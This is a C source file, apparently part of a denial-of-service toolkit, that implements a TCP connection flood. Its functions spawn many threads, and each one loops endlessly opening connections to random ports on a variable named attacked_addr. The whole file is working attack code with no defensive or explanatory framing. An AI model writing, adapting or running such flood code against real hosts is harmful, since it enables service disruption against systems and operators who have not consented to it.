#include "tcp_conn_flood.h"

void tcp_build(void *arg_ipinfo) {
    time_t t;
    srand((unsigned)time(&t));
    IPinfo *ipinfo = (IPinfo *)arg_ipinfo;

    while (1) {
        struct sockaddr_in server_addr;
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        int PORT = (rand()%65534) + 1;

        memset(&server_addr, '0', sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = ipinfo->attacked_addr;

        connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
        sleep(1);
        close(sockfd);
    }
    pthread_exit(0);

    return;
}

int tcp_conn_flood(IPinfo ipinfo, int MAX_THREADS) {
    pthread_t thread_id[MAX_THREADS];

    for(int i = 0; i < MAX_THREADS; i++) {
        ipinfo.thread_id = i;
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_create(&thread_id[i], &attr, (void*)tcp_build, (void*)&ipinfo);
        sleep(1);
    }

    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_join(thread_id[i], NULL);
    }

    return 0;
}
